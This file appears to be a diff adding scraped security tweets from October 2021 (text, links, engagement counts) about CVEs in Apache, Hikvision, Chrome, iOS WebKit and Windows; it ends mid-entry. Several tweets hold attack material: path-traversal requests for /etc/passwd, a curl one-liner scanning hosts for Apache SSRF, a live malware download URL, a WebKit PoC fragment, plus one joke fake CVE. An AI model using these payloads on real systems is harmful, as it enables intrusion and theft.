@@ -1,0 +1,880 @@
+{
+    "expanded_url": [
+        "https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html",
+        "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-36260.yaml"
+    ],
+    "tweetfavorites": 46,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 17,
+    "tweettext": "🚨🚨🚨\nRCE in hik vision ip camera \nUnauthenticated Remote Code Execution (RCE) vulnerability in Hikvision IP camera/NVR firmware (CVE-2021-36260)\nFor more info 👇👇\nhttps://t.co/9GSUHLHRYA\nOn nuclei 👇👇\nhttps://t.co/OlTq7gE0su\n\n#infosec #cybersecurity #bugbounty",
+    "tweettime": "2021-10-29, 17:53:17",
+    "tweeturl": "https://twitter.com/Mohamed87Khayat/status/1454144319384862724",
+    "username": "Mohamed87Khayat"
+}
+{
+    "expanded_url": [
+        "https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html"
+    ],
+    "tweetfavorites": 140,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 67,
+    "tweettext": "Unauthenticated Remote Code Execution (RCE) vulnerability in Hikvision IP camera/NVR firmware (CVE-2021-36260)\n\nhttps://t.co/xbP0ViOkNi\n\n#infosec https://t.co/540njXHQZ7",
+    "tweettime": "2021-10-29, 17:11:22",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1454133773356781570",
+    "username": "TheHackersNews"
+}
+{
+    "tweetfavorites": 158,
+    "tweetquotes": 1,
+    "tweetreplies": 10,
+    "tweetretweets": 26,
+    "tweettext": "CVE-2021-30914\nI used this one to complete my first iOS LPE exploit demo, on 2021-02-09, . Unfortunately, it is not easy to exploit it in iOS 14.2 and above. https://t.co/eOSSFpqFjR",
+    "tweettime": "2021-10-29, 14:49:41",
+    "tweeturl": "https://twitter.com/pattern_F_/status/1454098114999046152",
+    "username": "pattern_F_"
+}
+{
+    "expanded_url": [
+        "https://therecord.media/google-fixes-15th-and-16th-chrome-zero-day-this-year/",
+        "https://chromereleases.googleblog.com/2021/10/stable-channel-update-for-desktop_28.html"
+    ],
+    "tweetfavorites": 50,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 21,
+    "tweettext": "Google fixes 15th and 16th Chrome zero-day this year--the most Google has patched in Chrome in any single calendar year since the browser’s first release in 2008.\n\nhttps://t.co/JZKCb8jCHo\n\n-CVE-2021-38000\n-CVE-2021-38003\nhttps://t.co/3YU3FO5IfS https://t.co/6BywN2rSjR",
+    "tweettime": "2021-10-29, 09:19:53",
+    "tweeturl": "https://twitter.com/campuscodi/status/1454015121756405764",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://testbnull.medium.com/50-shades-of-solarwinds-orion-patch-manager-deserialization-final-part-cve-2021-35218-3d38166cb81f"
+    ],
+    "tweetfavorites": 267,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 96,
+    "tweettext": "Here is the final part of SolarWinds Orion Deserialization (CVE-2021-35218)\nThis vulnerability can be triggered without any authentication,\n*It's sad that ZDI didn't accept  this as an Pre-Auth RCE\nKudo @Y4er_ChaBug for detailed analysis!\nhttps://t.co/ggBgxMu3zF",
+    "tweettime": "2021-10-29, 08:21:16",
+    "tweeturl": "https://twitter.com/testanull/status/1454000368711450627",
+    "username": "testanull"
+}
+{
+    "expanded_url": [
+        "https://chromereleases.googleblog.com/2021/10/stable-channel-update-for-desktop_28.html"
+    ],
+    "tweetfavorites": 104,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 23,
+    "tweettext": "Google just released Chrome 95.0.4638.69 &amp; fixed two TianfuCup bugs which become the first patch for TianfuCup 2021 https://t.co/jCqcs3Cpll CVE-2021-38001  is the RCE from Kunlun lab &amp; CVE-2021-38002 is the SBX from 360(RCE one silence killed)",
+    "tweettime": "2021-10-28, 21:31:19",
+    "tweeturl": "https://twitter.com/mj0011sec/status/1453836802930843648",
+    "username": "mj0011sec"
+}
+{
+    "tweetfavorites": 32,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 19,
+    "tweettext": "Mass scanning activity detected from the following hosts targeting Fortinet VPN servers vulnerable to unauthenticated arbitrary file read (CVE-2018-13379) leading to disclosure of usernames and passwords in plaintext.",
+    "tweettime": "2021-10-27, 21:40:06",
+    "tweeturl": "https://twitter.com/bad_packets/status/1453476624385470464",
+    "username": "bad_packets"
+}
+{
+    "expanded_url": [
+        "https://github.com/projectdiscovery/nuclei-templates/blob/2d19236680fcf292c43734d6d524464396d294ae/cves/2021/CVE-2021-22205.yaml"
+    ],
+    "tweetfavorites": 274,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 92,
+    "tweettext": "Nuclei Template for CVE-2021-22205 - GitLab CE/EE Unauthenticated RCE using ExifTool\n\nTemplate: https://t.co/ELvga2mXyI\n\n#bugbounty #pentest #hackwithautomation #gitlab https://t.co/P18kC8IJJI",
+    "tweettime": "2021-10-27, 13:21:41",
+    "tweeturl": "https://twitter.com/pdnuclei/status/1453351196350029829",
+    "username": "pdnuclei"
+}
+{
+    "expanded_url": [
+        "https://securelist.com/puzzlemaker-chrome-zero-day-exploit-chain/102771/"
+    ],
+    "tweetfavorites": 180,
+    "tweetquotes": 5,
+    "tweetreplies": 2,
+    "tweetretweets": 69,
+    "tweettext": "#PuzzleMaker\nWe found a complete exploit chain which involves #Chrome #RCE vuln #CVE-2021-21224 and Windows EoP vuln #CVE-2021-31956 in the wild. This exploit chain allows attackers to escape Chrome sandbox and execute code with Windows system privileges.\n\nhttps://t.co/W3sPCNtR2G https://t.co/2J5zU7ho3Y",
+    "tweettime": "2021-10-27, 09:25:35",
+    "tweeturl": "https://twitter.com/RedDrip7/status/1453291780078714880",
+    "username": "RedDrip7"
+}
+{
+    "expanded_url": [
+        "https://github.com/ghost-nemesis/cve-2021-20837-poc"
+    ],
+    "tweetfavorites": 37,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 17,
+    "tweettext": "GitHub - ghost-nemesis/cve-2021-20837-poc: PoC for the CVE-2021-20837 : RCE in MovableType - https://t.co/t4wDqwsHln",
+    "tweettime": "2021-10-26, 00:02:50",
+    "tweeturl": "https://twitter.com/piedpiper1616/status/1452787768388505600",
+    "username": "piedpiper1616"
+}
+{
+    "expanded_url": [
+        "https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-33742.html"
+    ],
+    "tweetfavorites": 105,
+    "tweetquotes": 3,
+    "tweetreplies": 3,
+    "tweetretweets": 43,
+    "tweettext": "Root cause analysis for CVE-2021-33742, a zero-day in Internet Explorer\n\nhttps://t.co/QKigdIkYkK https://t.co/nIOUdxbgdK",
+    "tweettime": "2021-10-25, 03:50:00",
+    "tweeturl": "https://twitter.com/campuscodi/status/1452482549276577804",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://go.usa.gov/xMhyn",
+        "https://github.com/discourse/discourse/security/advisories/GHSA-jcjx-pvpc-qgwq"
+    ],
+    "tweetfavorites": 57,
+    "tweetquotes": 5,
+    "tweetreplies": 1,
+    "tweetretweets": 42,
+    "tweettext": "Discourse—an open source discussion platform—has released a security advisory to address a critical RCE vulnerability (CVE-2021-41163) in Discourse versions 2.7.8 and earlier. Please patch to versions 2.7.9 or later. https://t.co/VJEoQBi9CV\n\nDiscourse link https://t.co/CU8VnDLagg",
+    "tweettime": "2021-10-24, 18:50:35",
+    "tweeturl": "https://twitter.com/USCERT_gov/status/1452346803542806530",
+    "username": "USCERT_gov"
+}
+{
+    "expanded_url": [
+        "https://github.com/ly4k/CallbackHell"
+    ],
+    "tweetfavorites": 88,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 41,
+    "tweettext": "Exploit for CVE-2021-40449 - Win32k Elevation of Privilege Vulnerability (LPE) https://t.co/RbGq5kVfTT  #Pentesting #Exploit #Vulnerability #CVE #CyberSecurity #Infosec https://t.co/cDghTB5Vmd",
+    "tweettime": "2021-10-24, 15:31:31",
+    "tweeturl": "https://twitter.com/ptracesecurity/status/1452296706079477766",
+    "username": "ptracesecurity"
+}
+{
+    "expanded_url": [
+        "https://securityforeveryone.com/blog/google-chrome-zero-day-vulnerability-cve-2021-30573",
+        "https://github.com/s4e-lab/CVE-2021-30573-PoC-Google-Chrome"
+    ],
+    "tweetfavorites": 57,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 24,
+    "tweettext": "Google Chrome Vulnerability Worth for $6K : Use After Free (CVE-2021-30573) : https://t.co/XPEfv6e2FO \n\nCVE-2021-30573-PoC-Google-Chrome : https://t.co/ohNJyFiZ8Z\n\ncredits @secforeveryone",
+    "tweettime": "2021-10-24, 13:52:27",
+    "tweeturl": "https://twitter.com/binitamshah/status/1452271774641672200",
+    "username": "binitamshah"
+}
+{
+    "expanded_url": [
+        "https://github.com/discourse/discourse/security/advisories/GHSA-jcjx-pvpc-qgwq",
+        "https://0day.click/recipe/discourse-sns-rce/",
+        "https://articles.zsxq.com/id_ghcthgwba60r.html"
+    ],
+    "tweetfavorites": 242,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 91,
+    "tweettext": "CVE-2021-41163 Discourse RCE via malicious SNS subscription payload\n\nadvisory: https://t.co/3n06WatlKL\n\nanalysis: \n1、https://t.co/W1IrRNrOiJ\n2、https://t.co/va029JzvRv （chinese） https://t.co/PxAqGZ48rv",
+    "tweettime": "2021-10-23, 16:37:05",
+    "tweeturl": "https://twitter.com/chybeta/status/1451950816399560708",
+    "username": "chybeta"
+}
+{
+    "tweetfavorites": 39,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 14,
+    "tweettext": "Wow, great work! Popping calc on Office!\n\nThe attack vector (scripting ability) exposed by zero-day CVE-2021-40444 is being used fast in real-world exploitation. That’s why I said it’s “sophisticated” when I saw the ITW exploit in the first place.:-)\n\nA thread of my thoughts..",
+    "tweettime": "2021-10-22, 15:24:24",
+    "tweeturl": "https://twitter.com/HaifeiLi/status/1451570138377904129",
+    "username": "HaifeiLi"
+}
+{
+    "expanded_url": [
+        "https://medium.com/csg-govtech/all-your-d-base-are-belong-to-us-part-2-code-execution-in-microsoft-office-cve-2021-38646-fa6e70362162?source=friends_link&sk=364ec4e1a94ed387ccf0e29ede7773ec"
+    ],
+    "tweetfavorites": 481,
+    "tweetquotes": 11,
+    "tweetreplies": 14,
+    "tweetretweets": 171,
+    "tweettext": "My writeup for Microsoft Office RCE CVE-2021-38646. A pretty simple write-what-where that affects many other applications due to the vulnerable dependency. Hope it is helpful for fellow beginners :)\n\nhttps://t.co/uT20BPAVGT",
+    "tweettime": "2021-10-22, 11:35:54",
+    "tweeturl": "https://twitter.com/spaceraccoonsec/status/1451512634382045189",
+    "username": "spaceraccoonsec"
+}
+{
+    "expanded_url": [
+        "https://securelist.com/mysterysnail-attacks-with-windows-zero-day/104509/"
+    ],
+    "tweetfavorites": 35,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 23,
+    "tweettext": "An APT known as \"MysterySnail\" uses CVE-2021-40449 zero day* use-after-free vulnerability in the Win32k kernel.\n\nPer @craiu &amp;  @oct0xor, C2 hints point to a likely Chinese threat actor. Full details on @Securelist: \nhttps://t.co/jjTO3rgMG6\n\n *Now a \"9day\": patchable as of 10/11 https://t.co/cbXBivDyQl",
+    "tweettime": "2021-10-20, 13:46:21",
+    "tweeturl": "https://twitter.com/RayRedacted/status/1450820687141167112",
+    "username": "RayRedacted"
+}
+{
+    "tweetfavorites": 86,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 33,
+    "tweettext": "ZeroLogon (CVE-2020-1472) exploit used by a threat group utilizing Hancitor for initial access. \n\n➡️Report out in a couple weeks \n\ncc:@iiamaleks @samaritan_o @pigerlin @Kostastsale https://t.co/3Ohoy8KIoo",
+    "tweettime": "2021-10-20, 13:00:03",
+    "tweeturl": "https://twitter.com/TheDFIRReport/status/1450809036153131014",
+    "username": "TheDFIRReport"
+}
+{
+    "expanded_url": [
+        "https://securelist.com/mysterysnail-attacks-with-windows-zero-day/104509/",
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40449"
+    ],
+    "tweetfavorites": 211,
+    "tweetquotes": 4,
+    "tweetreplies": 2,
+    "tweetretweets": 73,
+    "tweettext": "We found an approach to exploit Windows zero-day vuln #CVE-2021-40449 which has been used in #MysterySnail #APT activity. It is a use-after-free EoP vulnerability in Win32k and was patched on October 12, 2021.\n\nhttps://t.co/tXE7xMdvFv\nhttps://t.co/RYuEcDKLBO https://t.co/O9qwpEx5H4",
+    "tweettime": "2021-10-20, 08:39:15",
+    "tweeturl": "https://twitter.com/RedDrip7/status/1450743401641431048",
+    "username": "RedDrip7"
+}
+{
+    "expanded_url": [
+        "https://securitylab.github.com/research/in_the_wild_chrome_cve_2021_37975/"
+    ],
+    "tweetfavorites": 70,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 21,
+    "tweettext": "Another truly excellent write-up from @mmolgtm! This time about the recent Chrome v8 0-day in-the-wild, CVE-2021-37975. #itw0days\n\nhttps://t.co/3pD0GBI0Di",
+    "tweettime": "2021-10-19, 16:56:36",
+    "tweeturl": "https://twitter.com/maddiestone/status/1450506177985482756",
+    "username": "maddiestone"
+}
+{
+    "expanded_url": [
+        "https://www.synacktiv.com/sites/default/files/2021-10/AppJailLauncher.pdf"
+    ],
+    "tweetfavorites": 117,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 53,
+    "tweettext": "Logical sandbox escape in AppJailLauncher (fix in AppJailLauncher plus Microsoft CVE-2021-41346), thanks @thalium_team for the blog post that led to the discovery of the bugs !\nhttps://t.co/ukRwPogStZ https://t.co/1PJGGBfXcA",
+    "tweettime": "2021-10-18, 13:40:02",
+    "tweeturl": "https://twitter.com/masthoon/status/1450094320028106767",
+    "username": "masthoon"
+}
+{
+    "tweetfavorites": 32,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 11,
+    "tweettext": "Mass scanning activity detected from the following hosts targeting Fortinet VPN servers vulnerable to unauthenticated arbitrary file read (CVE-2018-13379) leading to disclosure of usernames and passwords in plaintext.",
+    "tweettime": "2021-10-18, 02:28:17",
+    "tweeturl": "https://twitter.com/bad_packets/status/1449925270387920898",
+    "username": "bad_packets"
+}
+{
+    "tweetfavorites": 59,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 31,
+    "tweettext": "Active DDoS malware payload detected:\nhttp://136.144.41.46/d.sh (🇳🇱)\n# file_server=\"136.144.41.46\"\n# files=\"b.arm6 b.arm7 b.mips b.mpsl\"\n# outfile=\"putin\"\n\nVulnerability targeted:\nD-Link router RCE (CVE-2019-16920)\n\nExploit attempt source IP:\n193.122.151.6 (🇺🇸)\n#threatintel https://t.co/ixR2VAHy3E",
+    "tweettime": "2021-10-18, 02:11:18",
+    "tweeturl": "https://twitter.com/bad_packets/status/1449920995712638981",
+    "username": "bad_packets"
+}
+{
+    "expanded_url": [
+        "https://github.com/SigmaHQ/sigma/pull/2124/files"
+    ],
+    "tweetfavorites": 113,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 50,
+    "tweettext": "CVE-2021-41773 POC 🔥\nDescription: Path Traversal vulnerability in Apache 2.4.49.\nhttps://t.co/e5u1ty0Ula\n\n#infosec #bugbounty #ethicalhacking #apache #hackerone #bugbountytips #cybersecurity https://t.co/0MfVm2PZhN",
+    "tweettime": "2021-10-17, 10:31:27",
+    "tweeturl": "https://twitter.com/andridev_/status/1449684475994984449",
+    "username": "andridev_"
+}
+{
+    "tweetfavorites": 2579,
+    "tweetquotes": 88,
+    "tweetreplies": 79,
+    "tweetretweets": 563,
+    "tweettext": "CVE-2022-1337: “View Source” affects all known web browsers. \n\n—Description— \nWhen the F12 key is pressed, the browser outputs source code of target website; no patch available, CVSS: 10. \n\n#infosec #cybersecurity #hackers #hacking #hacked #cybercrime #tech",
+    "tweettime": "2021-10-17, 00:54:47",
+    "tweeturl": "https://twitter.com/GothamJSharma/status/1449539350979547136",
+    "username": "GothamJSharma"
+}
+{
+    "tweetfavorites": 37,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 19,
+    "tweettext": "Mass scanning activity detected from 80.85.156.136 (🇷🇺) targeting Microsoft Exchange servers vulnerable to ProxyShell (CVE-2021-34473) and F5 BIG-IP servers vulnerable to remote code execution (CVE-2020-5902). #threatintel",
+    "tweettime": "2021-10-16, 18:47:56",
+    "tweeturl": "https://twitter.com/bad_packets/status/1449447032402284546",
+    "username": "bad_packets"
+}
+{
+    "expanded_url": [
+        "https://github.com/ollypwn/CallbackHell"
+    ],
+    "tweetfavorites": 277,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 103,
+    "tweettext": "I've created a PoC (DoS) for CVE-2021-40449 (Win32k - LPE) with a technical writeup, commented code, and steps to further exploit the vulnerability. Before going further myself, I thought I'd share this.\n\nhttps://t.co/wKjw5iZIjb",
+    "tweettime": "2021-10-16, 16:30:44",
+    "tweeturl": "https://twitter.com/ly4k_/status/1449412505894330372",
+    "username": "ly4k_"
+}
+{
+    "expanded_url": [
+        "https://www.psxhax.com/threads/ps5-webkit-also-affected-by-use-after-free-vulnerability-cve-2021-30858.10279/"
+    ],
+    "tweetfavorites": 39,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 7,
+    "tweettext": "PS5 WebKit Also Affected by Use-After-Free Vulnerability (CVE-2021-30858) | PSXHAX - PSXHACKS https://t.co/or0B7qQjpJ",
+    "tweettime": "2021-10-16, 00:08:09",
+    "tweeturl": "https://twitter.com/sdragon001/status/1449165227782721541",
+    "username": "sdragon001"
+}
+{
+    "expanded_url": [
+        "https://www.psxhax.com/threads/ps5-webkit-also-affected-by-use-after-free-vulnerability-cve-2021-30858.10279/"
+    ],
+    "tweetfavorites": 102,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 15,
+    "tweettext": "PS5 WebKit Also Affected by Use-After-Free Vulnerability (CVE-2021-30858)\nhttps://t.co/c9uzJGg7EQ",
+    "tweettime": "2021-10-15, 22:11:48",
+    "tweeturl": "https://twitter.com/PSXHaxDOTcom/status/1449135949850497027",
+    "username": "PSXHaxDOTcom"
+}
+{
+    "expanded_url": [
+        "https://bugbounty.requestcatcher.com/ssrf"
+    ],
+    "tweetfavorites": 141,
+    "tweetquotes": 2,
+    "tweetreplies": 6,
+    "tweetretweets": 39,
+    "tweettext": "CVE-2021-40438 Apache mod_proxy SSRF 🔥\n\n✅One Liner POC :\ncat file.txt | while read host do;do curl --path-as-is --insecure \"$host/?unix:(7701 A's here) | \"https://t.co/VOG5gPgWOE\" | grep \"request caught\" &amp;&amp; echo \"$host \\033[0;31mVuln\\n\" || echo \"$host \\033[0;32mNot\\n\";done",
+    "tweettime": "2021-10-15, 21:10:02",
+    "tweeturl": "https://twitter.com/HackerGautam/status/1449120404178563072",
+    "username": "HackerGautam"
+}
+{
+    "tweetfavorites": 396,
+    "tweetquotes": 6,
+    "tweetreplies": 3,
+    "tweetretweets": 109,
+    "tweettext": "CVE-2021-40438 Apache SSRF as a one-liner. https://t.co/RG69SAptTM",
+    "tweettime": "2021-10-15, 14:34:11",
+    "tweeturl": "https://twitter.com/_mattata/status/1449020783989297167",
+    "username": "_mattata"
+}
+{
+    "expanded_url": [
+        "https://firzen.de/building-a-poc-for-cve-2021-40438"
+    ],
+    "tweetfavorites": 34,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 14,
+    "tweettext": "Building a POC for CVE-2021-40438 – SSRF in apache2 mod_proxy https://t.co/eD5nPBy8mN",
+    "tweettime": "2021-10-15, 13:28:07",
+    "tweeturl": "https://twitter.com/_r_netsec/status/1449004158829219844",
+    "username": "_r_netsec"
+}
+{
+    "expanded_url": [
+        "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-40438.yaml",
+        "https://firzen.de/building-a-poc-for-cve-2021-40438"
+    ],
+    "tweetfavorites": 609,
+    "tweetquotes": 8,
+    "tweetreplies": 3,
+    "tweetretweets": 228,
+    "tweettext": "Apache &lt;= 2.4.48 - Mod_Proxy SSRF (CVE-2021-40438)\n\nNuclei Template - https://t.co/vbQANmrdI0\n\nReference - https://t.co/rliMLU9DDg\n\n#apache #cve #ssrf #bugbounty #pentest #appsec https://t.co/4q57lclGBh",
+    "tweettime": "2021-10-14, 22:41:01",
+    "tweeturl": "https://twitter.com/pdnuclei/status/1448780914750681098",
+    "username": "pdnuclei"
+}
+{
+    "expanded_url": [
+        "https://www.psxhax.com/threads/ps4-webkit-exploit-test-for-use-after-free-cve-2021-30858-vulnerability.10277/"
+    ],
+    "tweetfavorites": 132,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 30,
+    "tweettext": "PS4 WebKit Exploit Test for Use-After-Free (CVE-2021-30858) Vulnerability\nhttps://t.co/7w2784LFaB",
+    "tweettime": "2021-10-14, 08:29:06",
+    "tweeturl": "https://twitter.com/PSXHaxDOTcom/status/1448566520406282240",
+    "username": "PSXHaxDOTcom"
+}
+{
+    "expanded_url": [
+        "https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-30858.html"
+    ],
+    "tweetfavorites": 82,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 33,
+    "tweettext": "‼️ iOS WebKit RCE 0-day (CVE-2021-30858) in the wild including POC\n🎯Affected Versions: pre-Safari 14.1.2, pre-iOS 14.8\n🔥UPDATE immediately to the latest iOS version\n#MobileSecurity #iOSsecurity by @maddiestone and @ProjectZeroBugs \nhttps://t.co/zwaxArmyOw",
+    "tweettime": "2021-10-14, 08:16:57",
+    "tweeturl": "https://twitter.com/mobilesecurity_/status/1448563465593966593",
+    "username": "mobilesecurity_"
+}
+{
+    "expanded_url": [
+        "https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-30858.html"
+    ],
+    "tweetfavorites": 194,
+    "tweetquotes": 3,
+    "tweetreplies": 7,
+    "tweetretweets": 93,
+    "tweettext": "[BREAKING] CVE-2021-30858 iOS WebKit RCE 0-day in the wild: https://t.co/3zGZtPbMte including POC. Can be chained with CVE-2021-30883 and used in 1-clicks and water-holing attacks against iOS users.\n\nUpdate to the latest version as soon as possible.",
+    "tweettime": "2021-10-14, 05:53:56",
+    "tweeturl": "https://twitter.com/ZecOps/status/1448527474065752070",
+    "username": "ZecOps"
+}
+{
+    "expanded_url": [
+        "https://dl.packetstormsecurity.net/2110-exploits/apache2450-traversalexec.txt"
+    ],
+    "tweetfavorites": 251,
+    "tweetquotes": 2,
+    "tweetreplies": 3,
+    "tweetretweets": 108,
+    "tweettext": "[Apache] HTTP Server cgi-bin Path Traversal and RCE (CVE-2021-42013)\n\nThis exploit can bypass for Apache HTTP Server 2.4.50 (CVE-2021-41773 Patch Version)\n\nGET /cgi-bin/%%32%65%%32%65/.../%%32%65%%32%65/etc/passwd HTTP/1.1\n\nhttps://t.co/J3VlUh5pw4 https://t.co/0eLtCyuAa9",
+    "tweettime": "2021-10-14, 05:23:47",
+    "tweeturl": "https://twitter.com/wugeej/status/1448519884808146944",
+    "username": "wugeej"
+}
+{
+    "expanded_url": [
+        "http://fontFace1.family",
+        "https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-30858.html"
+    ],
+    "tweetfavorites": 491,
+    "tweetquotes": 12,
+    "tweetreplies": 11,
+    "tweetretweets": 146,
+    "tweettext": "🌟 RCA for WebKit itw 0-day CVE-2021-30858 🌟\n#itw0days \nI do love me a tweetable poc:\n\nvar fontFace1 = new FontFace(\"font1\", \"\", {});\nvar fontFaceSet = new FontFaceSet([fontFace1]);\nhttps://t.co/diiDQMUoSM = \"font2\";\n\nhttps://t.co/r1mHx3kYrU",
+    "tweettime": "2021-10-13, 15:05:42",
+    "tweeturl": "https://twitter.com/maddiestone/status/1448303942979313674",
+    "username": "maddiestone"
+}
+{
+    "expanded_url": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36970"
+    ],
+    "tweetfavorites": 247,
+    "tweetquotes": 2,
+    "tweetreplies": 7,
+    "tweetretweets": 92,
+    "tweettext": "1/8 Here's my quick analysis on the new Print Spooler vulnerability (CVE-2021-36970)\n\nFew details are currently available, but Microsoft states that this is a spoofing vulnerability with a CVSS score of 8.8.\n\nhttps://t.co/1tBouYThMC",
+    "tweettime": "2021-10-12, 23:12:43",
+    "tweeturl": "https://twitter.com/ly4k_/status/1448064117378584576",
+    "username": "ly4k_"
+}
+{
+    "expanded_url": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40449"
+    ],
+    "tweetfavorites": 41,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 29,
+    "tweettext": "Among 81 vulnerabilities, Microsoft also patches a local privilege escalation (CVE-2021-40449) that is actively being used in the wild. https://t.co/jyUHwk0OqZ\nPatch now!",
+    "tweettime": "2021-10-12, 18:28:57",
+    "tweeturl": "https://twitter.com/GovCERT_CH/status/1447992702826582024",
+    "username": "GovCERT_CH"
+}
+{
+    "expanded_url": [
+        "https://rawcdn.githack.com/campuscodi/Microsoft-Patch-Tuesday-Security-Reports/cb79f8be8133dbcfaac380ac04b456c2e0ecb987/Reports/MSRC_CVEs2021-Oct.html"
+    ],
+    "tweetfavorites": 144,
+    "tweetquotes": 5,
+    "tweetreplies": 2,
+    "tweetretweets": 67,
+    "tweettext": "The Microsoft October 2021 Patch Tuesday fixes are out.\n\n-81 vulnerabilities fixed\n-one actively exploited zero-day (CVE-2021-40449)\n\nhttps://t.co/zKYxm3MFuu https://t.co/vLD3r9TDz6",
+    "tweettime": "2021-10-12, 17:45:45",
+    "tweeturl": "https://twitter.com/campuscodi/status/1447981830234333188",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://talosintelligence.com/vulnerability_reports/TALOS-2021-1259"
+    ],
+    "tweetfavorites": 41,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 12,
+    "tweettext": "CVE-2021-40474 - Microsoft Office Excel 2019/365 ConditionalFormatting code execution vulnerability\nhttps://t.co/Y82Y0qeVpw",
+    "tweettime": "2021-10-12, 17:37:30",
+    "tweeturl": "https://twitter.com/_Icewall/status/1447979757258395656",
+    "username": "_Icewall"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2021/10/apple-releases-urgent-iphone-and-ipad.html"
+    ],
+    "tweetfavorites": 247,
+    "tweetquotes": 19,
+    "tweetreplies": 3,
+    "tweetretweets": 208,
+    "tweettext": "Apple has released urgent #iOS 15.0.2 and #iPadOS 15.0.2 updates to address a new critical 0-day #vulnerability (CVE-2021-30883) that is being actively exploited in the wild.\n\nRead details: https://t.co/dKBxXfxJk1\n\n#infosec #cybersecurity #hacking #iPhone",
+    "tweettime": "2021-10-12, 02:45:24",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1447755249729503232",
+    "username": "TheHackersNews"
+}
+{
+    "tweetfavorites": 72,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 36,
+    "tweettext": "Mass scanning activity detected from the following hosts targeting Fortinet VPN servers vulnerable to unauthenticated arbitrary file read (CVE-2018-13379) leading to disclosure of usernames and passwords in plaintext.",
+    "tweettime": "2021-10-11, 19:52:43",
+    "tweeturl": "https://twitter.com/bad_packets/status/1447651394912063488",
+    "username": "bad_packets"
+}
+{
+    "expanded_url": [
+        "https://github.com/rapid7/metasploit-framework/pull/15754#issuecomment-938575513"
+    ],
+    "tweetfavorites": 51,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 22,
+    "tweettext": "I just update the PoC to introduce the CVE-2021-42013 (Traversal/RCE into Apache 2.4.49/2.4.50)\n\nSupport more check, incluing the file reading on remote vulnerable servers (from @RandomDhiraj).\n\ncc @metasploit, @ANSSI_FR @Dinosn \n\nhttps://t.co/nw13F11Plx",
+    "tweettime": "2021-10-08, 12:27:00",
+    "tweeturl": "https://twitter.com/Mekhalleh/status/1446452062020067328",
+    "username": "Mekhalleh"
+}
+{
+    "tweetfavorites": 43,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 18,
+    "tweettext": "Reproduce CVE-2021-42013 Apache 2.4.50 path traversal vulnerability.\n\nPath traversal vulnerability\n\nGET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd\n\n#infosec #cybersecurity #Apache https://t.co/MovReofUqO",
+    "tweettime": "2021-10-08, 05:48:01",
+    "tweeturl": "https://twitter.com/Vulnmachines/status/1446351656568852483",
+    "username": "Vulnmachines"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2021/10/new-patch-released-for-actively.html"
+    ],
+    "tweetfavorites": 206,
+    "tweetquotes": 4,
+    "tweetreplies": 4,
+    "tweetretweets": 148,
+    "tweettext": "A new urgent Apache patch update has been released for the actively exploited Path Traversal issue (CVE-2021-41773), which has now been identified as a critical remote code execution #vulnerability.\n\nDetails: https://t.co/XmJyzQjUKm\n\n#infosec #cybersecurity #sysadmin #hacking",
+    "tweettime": "2021-10-08, 04:54:11",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1446338109294084100",
+    "username": "TheHackersNews"
+}
+{
